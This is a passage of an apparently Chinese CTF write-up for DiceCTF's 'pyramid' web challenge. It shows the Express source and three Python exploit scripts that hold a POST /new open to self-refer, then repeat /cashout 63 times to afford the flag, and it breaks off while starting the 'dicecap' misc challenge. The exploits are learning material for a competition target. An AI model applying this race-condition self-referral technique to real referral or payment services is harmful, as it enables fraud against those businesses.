title="pyramid(复现学习)"></a>pyramid(复现学习)</h2><blockquote><p>Would you like to buy some supplements?</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> css = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;link</span></span><br><span class="line"><span class="string">        rel=&quot;stylesheet&quot;</span></span><br><span class="line"><span class="string">        href=&quot;https://unpkg.com/axist@latest/dist/axist.min.css&quot;</span></span><br><span class="line"><span class="string">    &gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"><span class="keyword">const</span> codes = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">random</span> = (<span class="params"></span>) =&gt; crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">escape</span> = (<span class="params">str</span>) =&gt; str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">referrer</span> = (<span class="params">code</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (code &amp;&amp; codes.<span class="title function_">has</span>(code)) &#123;</span><br><span class="line">        <span class="keyword">const</span> token = codes.<span class="title function_">get</span>(code)</span><br><span class="line">        <span class="keyword">if</span> (users.<span class="title function_">has</span>(token)) &#123;</span><br><span class="line">            <span class="keyword">return</span> users.<span class="title function_">get</span>(token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, _res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">headers</span>.<span class="property">cookie</span>?.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)?.[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        req.<span class="property">token</span> = token</span><br><span class="line">        <span class="keyword">if</span> (users.<span class="title function_">has</span>(token)) &#123;</span><br><span class="line">            req.<span class="property">user</span> = users.<span class="title function_">get</span>(token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Account: <span class="subst">$&#123;<span class="built_in">escape</span>(req.user.name)&#125;</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            You have &lt;strong&gt;<span class="subst">$&#123;req.user.bal&#125;</span>&lt;/strong&gt; coins.</span></span><br><span class="line"><span class="string">            You have referred &lt;strong&gt;<span class="subst">$&#123;req.user.ref&#125;</span>&lt;/strong&gt; users.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;hr&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/code&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Generate referral code&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/cashout&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">                    Cashout <span class="subst">$&#123;req.user.ref&#125;</span> referrals</span></span><br><span class="line"><span class="string">                &lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/buy&quot; method=&quot;GET&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Purchase flag&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Register&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/new&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input name=&quot;name&quot; type=&quot;text&quot; placeholder=&quot;Name&quot; required&gt;</span></span><br><span class="line"><span class="string">                &lt;input</span></span><br><span class="line"><span class="string">                    name=&quot;refer&quot;</span></span><br><span class="line"><span class="string">                    type=&quot;text&quot;</span></span><br><span class="line"><span class="string">                    placeholder=&quot;Referral code (optional)&quot;</span></span><br><span class="line"><span class="string">                &gt;</span></span><br><span class="line"><span class="string">                &lt;button type=&quot;submit&quot;&gt;Register&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/new&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = <span class="title function_">random</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> body = []</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">bind</span>(body))</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(body).<span class="title function_">toString</span>()</span><br><span class="line">        <span class="keyword">const</span> parsed = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(data)</span><br><span class="line">        <span class="keyword">const</span> name = parsed.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)?.<span class="title function_">toString</span>() ?? <span class="string">&#x27;JD&#x27;</span></span><br><span class="line">        <span class="keyword">const</span> code = parsed.<span class="title function_">get</span>(<span class="string">&#x27;refer&#x27;</span>) ?? <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// referrer receives the referral</span></span><br><span class="line">        <span class="keyword">const</span> r = <span class="title function_">referrer</span>(code)</span><br><span class="line">        <span class="keyword">if</span> (r) &#123; r.<span class="property">ref</span> += <span class="number">1</span> &#125;</span><br><span class="line"></span><br><span class="line">        users.<span class="title function_">set</span>(token, &#123;</span><br><span class="line">            name,</span><br><span class="line">            code,</span><br><span class="line">            <span class="attr">ref</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">bal</span>: <span class="number">0</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">header</span>(<span class="string">&#x27;set-cookie&#x27;</span>, <span class="string">`token=<span class="subst">$&#123;token&#125;</span>`</span>)</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">token</span></span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="keyword">const</span> code = <span class="title function_">random</span>()</span><br><span class="line">        codes.<span class="title function_">set</span>(code, token)</span><br><span class="line">        res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">            &lt;h1&gt;Referral code generated&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Your code: &lt;strong&gt;<span class="subst">$&#123;code&#125;</span>&lt;/strong&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">        `</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// referrals translate 1:1 to coins</span></span><br><span class="line"><span class="comment">// you receive half of your referrals as coins</span></span><br><span class="line"><span class="comment">// your referrer receives the other half as kickback</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// if your referrer is null, you can turn all referrals into coins</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/cashout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> u = req.<span class="property">user</span></span><br><span class="line">        <span class="keyword">const</span> r = <span class="title function_">referrer</span>(u.<span class="property">code</span>)</span><br><span class="line">        <span class="keyword">if</span> (r) &#123;</span><br><span class="line">            [u.<span class="property">ref</span>, r.<span class="property">ref</span>, u.<span class="property">bal</span>] = [<span class="number">0</span>, r.<span class="property">ref</span> + u.<span class="property">ref</span> / <span class="number">2</span>, u.<span class="property">bal</span> + u.<span class="property">ref</span> / <span class="number">2</span>]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            [u.<span class="property">ref</span>, u.<span class="property">bal</span>] = [<span class="number">0</span>, u.<span class="property">bal</span> + u.<span class="property">ref</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/buy&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> user = req.<span class="property">user</span></span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">bal</span> &gt; <span class="number">100_000_000_000</span>) &#123;</span><br><span class="line">            user.<span class="property">bal</span> -= <span class="number">100_000_000_000</span></span><br><span class="line">            res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">                <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">                &lt;h1&gt;Successful purchase&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">$&#123;process.env.FLAG&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            `</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>).<span class="title function_">end</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;css&#125;</span></span></span><br><span class="line"><span class="string">        &lt;h1&gt;Not enough coins&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><p>太好玩了，简直无懈可击，不是吗？（潘队：还是太安全了；放弃了，我需要马上玩游戏）</p><p>用户不使用推荐码进行注册，那么拉到的人头都是自己的；而使用推荐码注册，拉到的人头要跟上级对半分</p><p>emmm，感觉是可以通过<strong>自荐</strong>来获得1.5的<strong>指数爆炸</strong>效果，如果可以的话，应该发送63个数据包这样就可以实现。我测试过自荐，但很可惜，它不是在原有基础上再进行1.5指数倍增长，而是一部分一部分的转化，是加算，并且，通过发包发现，并不能实现1.5倍的转化，拿到多少是多少，意思就是没能实现自荐。。。</p><p>总不能我<code>yakit</code>多线程发包发到一千亿吧()</p><p>这题就像一个倒立的金字塔，越下面的人收获就越少……</p><p>赛后，要了<code>V&amp;N</code>一位师傅的<code>exp</code>，钻研之后，接着又去<code>discord</code>找<code>wp</code>，均进行了小改，以下脚本全部实现了自动化</p><p>首先，说一下<strong>实现自荐</strong>的思路：其实是因为<code>/new</code>路径下的<code>req.on(&#39;data&#39;) req.on(&#39;end&#39;)</code>，这里导致了可以实现<strong>分块传输</strong>，然后我们第一个块先<code>new</code>，获取到<code>token</code>(读完<code>请求body</code>就可以拿到<code>token</code>)，接着<code>Python发包</code>获取到<code>code</code>，第二个块就自荐注册，然后<strong>关闭进程</strong>，注意此过程<code>token</code>是一直要有的，最后要用一下推荐码才能有最开始的1.5，然后进行转换<strong>63次</strong>即可(1.5^63=1240亿)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRef</span>(<span class="params">code</span>):</span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/new&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;attacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;refer&quot;</span>: code</span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url, data=data, verify=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># 建立HTTPS连接</span></span><br><span class="line">    host = <span class="string">&#x27;pyramid.dicec.tf&#x27;</span></span><br><span class="line">    port = <span class="number">443</span>  <span class="comment"># HTTPS默认端口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建SSL上下文</span></span><br><span class="line">    context = ssl.create_default_context()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建普通socket</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 包装为SSL socket</span></span><br><span class="line">    ssl_sock = context.wrap_socket(s, server_hostname=host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接到服务器</span></span><br><span class="line">    ssl_sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造分块请求头</span></span><br><span class="line">    request = (</span><br><span class="line">        <span class="string">&quot;POST /new HTTP/1.1\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Host: &#123;host&#125;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Transfer-Encoding: chunked\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    ).<span class="built_in">format</span>(host=host)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送请求头</span></span><br><span class="line">    ssl_sock.send(request.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收服务器响应头（包含Set-Cookie）</span></span><br><span class="line">    response = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;\r\n\r\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response:  <span class="comment"># 读取到空行表示响应头结束</span></span><br><span class="line">        response += ssl_sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    headers = response.split(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)[<span class="number">0</span>].decode()</span><br><span class="line">    cookie_header = [line <span class="keyword">for</span> line <span class="keyword">in</span> headers.split(</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span>) <span class="keyword">if</span> <span class="string">&#x27;set-cookie:&#x27;</span> <span class="keyword">in</span> line.lower()][<span class="number">0</span>]</span><br><span class="line">    token = cookie_header.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/code&quot;</span></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url, cookies=cookie, verify=<span class="literal">True</span>)</span><br><span class="line">    code = re.findall(<span class="string">r&#x27;&lt;strong&gt;(.*?)&lt;/strong&gt;&#x27;</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;获取到的code: <span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送第二个块：包含refer=code的数据</span></span><br><span class="line">    refer_data = <span class="string">f&quot;name=attacker&amp;refer=<span class="subst">&#123;code&#125;</span>&quot;</span>.encode()</span><br><span class="line">    chunk2_length = <span class="built_in">format</span>(<span class="built_in">len</span>(refer_data), <span class="string">&#x27;x&#x27;</span>)  <span class="comment"># 将长度转换为十六进制字符串</span></span><br><span class="line">    chunk2 = <span class="string">f&quot;<span class="subst">&#123;chunk2_length&#125;</span>\r\n<span class="subst">&#123;refer_data.decode()&#125;</span>\r\n&quot;</span></span><br><span class="line">    ssl_sock.send(chunk2.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送结束块</span></span><br><span class="line">    ssl_sock.send(<span class="string">b&quot;0\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭连接</span></span><br><span class="line">    ssl_sock.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Exploit成功！Token已注入：<span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    addRef(code)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cashout</span>(<span class="params">token</span>):</span><br><span class="line">    url = <span class="string">&quot;https://pyramid.dicec.tf/cashout&quot;</span></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    requests.get(url, cookies=cookie, verify=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    token = exploit()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">        cashout(token)</span><br><span class="line">    res = requests.get(<span class="string">&quot;https://pyramid.dicec.tf/buy&quot;</span>,</span><br><span class="line">                       cookies=&#123;<span class="string">&quot;token&quot;</span>: token&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这里是<code>V&amp;N</code>的师傅的<code>exp</code>，我小改动了一下，主要是通过<code>socket</code>创建进程，注意到<strong>分块请求头</strong>和<strong>结束块</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">hostname = <span class="string">&#x27;pyramid.dicec.tf&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;hostname&#125;</span>&#x27;</span></span><br><span class="line">context = ssl.create_default_context()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((hostname, <span class="number">443</span>)) <span class="keyword">as</span> sock:</span><br><span class="line">    <span class="keyword">with</span> context.wrap_socket(sock, server_hostname=hostname) <span class="keyword">as</span> ssock:</span><br><span class="line">        ssock.send(<span class="string">b&#x27;POST /new HTTP/1.1\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Host: pyramid.dicec.tf\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Connection: keep-alive\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Keep-Alive: timeout=25\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Host: pyramid.dicec.tf\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;Content-Length: 51\r\n&#x27;</span></span><br><span class="line">                   <span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">        res = ssock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        token = re.search(<span class="string">r&quot;token=(\w+)&quot;</span>, res)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">        resp = requests.get(url + <span class="string">&#x27;/code&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">        code = re.search(<span class="string">r&quot;strong&gt;(\w+)&lt;/strong&quot;</span>, resp.text)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Code: <span class="subst">&#123;code&#125;</span>&#x27;</span>)</span><br><span class="line">        ssock.send(<span class="string">f&#x27;name=pepos&amp;refer=<span class="subst">&#123;code&#125;</span>&#x27;</span>.encode())</span><br><span class="line">        requests.post(url + <span class="string">&#x27;/new&#x27;</span>, data=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;pepos&#x27;</span>, <span class="string">&#x27;refer&#x27;</span>: code&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Generated self-referential user&#x27;</span>)</span><br><span class="line">        ssock.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">    requests.get(url + <span class="string">&#x27;/cashout&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">res = requests.get(url + <span class="string">&#x27;/buy&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这里是<code>discord</code>上面一位师傅发的，也是通过<code>socket</code>创建进程，但这里并没有发现需要分块请求头，有点奇怪</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;https://pyramid.dicec.tf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># POST a request to /new but don&#x27;t send data yet</span></span><br><span class="line"><span class="comment"># We receive the cookie with our user token because of the server implementation</span></span><br><span class="line">r = remote(<span class="string">&#x27;pyramid.dicec.tf&#x27;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;POST /new HTTP/1.1\r\nHost: pyramid.dicec.tf:443\r\nContent-Length: 100\r\n\r\n&#x27;</span>)</span><br><span class="line">token = r.recv().decode().split(<span class="string">&#x27;token=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;\r\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate a new code for our not totally created account</span></span><br><span class="line">res = requests.get(URL + <span class="string">&#x27;/code&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">code = res.text.split(<span class="string">&#x27;&lt;strong&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/strong&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Complete the initial registration with self-referral</span></span><br><span class="line">r.send(<span class="string">b&#x27;refer=&#x27;</span> + code.encode() + <span class="string">b&#x27;&amp;a=1&#x27;</span> * <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create another account so that our ref count is set to 1</span></span><br><span class="line">requests.post(URL + <span class="string">&#x27;/new&#x27;</span>, data=&#123;<span class="string">&#x27;refer&#x27;</span>: code&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit the /cashout exponential growth in case of self-referral</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">63</span>):</span><br><span class="line">    requests.get(URL + <span class="string">&#x27;/cashout&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Buy the flag</span></span><br><span class="line">res = requests.get(URL + <span class="string">&#x27;/buy&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>这也是<code>discord</code>上面的一位师傅发的，也是长见识了，<strong>pwntools</strong>也能<strong>实现分块传输</strong>，好思路</p><p>我试了一下，<code>Python</code>的<code>requests</code>发包可能是无法实现分块传输的，应该是需要借助进程才能实现</p><p>这样看，这道题还是挺有意思的</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="dicecap"><a href="#dicecap" class="headerlink" title="dicecap"></a>dicecap</h2><blockquote><p>As DiceGang haven’t won a CTF in 4 months, we’ve taken to more drastic measures to get to the top of the leaderboard - hacking our competitors! This pcap was gathered from a previous “information gathering” mission, can you find the flag?</p></blockquote><p>先导一下，得到一个压缩包<code>coolzip.zip</code>和二进制文件<code>main</code><br><img src="https://picx.zhimg.com/80/v2-7e1d5e967d495c54348dc24b5d8a0c8e_1440w.png" alt=""><br><code>ida</code>反编译</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">generate_password</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">6</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+26h] [rbp-3Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%d&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v1 - v1 % <span class="number">60</span>));</span><br><span class="line">  src = setlocale(<span class="number">6</span>, &amp;locale);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, <span class="number">5uLL</span>);</span><br><span class="line">  dest[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  v3 = getlogin();</span><br><span class="line">  <span class="built_in">strcat</span>(v6, s);</span><br><span class="line">  <span class="built_in">strcat</span>(v6, dest);</span><br><span class="line">  <span class="built_in">strcat</span>(v6, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The password is:%s\n&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交给<code>ChatGPT</code><br><img src="https://picx.zhimg.com/80/v2-04d7b1da0e83ea1bef2f76e28652534d_1440w.png" 